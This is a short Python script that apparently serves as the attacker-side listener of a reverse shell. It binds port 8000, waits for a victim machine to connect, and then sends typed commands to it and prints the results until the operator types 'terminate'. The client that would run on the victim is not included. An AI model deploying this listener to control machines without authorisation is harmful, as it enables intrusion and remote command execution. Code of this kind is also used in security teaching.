from socket import *

serverPort = 8000
serverSocket = socket(AF_INET,SOCK_STREAM)
serverSocket.setsockopt(SOL_SOCKET,SO_REUSEADDR,1)
serverSocket.bind(('',serverPort))
serverSocket.listen(1)
print("Attacker box listening and awaiting orders: ")
connectionSocket, addr = serverSocket.accept()

print("Thanks for connecting to me "+ str(addr))

message = connectionSocket.recv(1024)
print(message)
command=""
while command != 'terminate':
    command = input("Please enter a command: ")
    connectionSocket.send(command.encode()) #encoding is always needed because the socket functions work with binary data
    message = connectionSocket.recv(1024).decode()
    print(message)

connectionSocket.shutdown(SHUT_RDWR)
connectionSocket.close()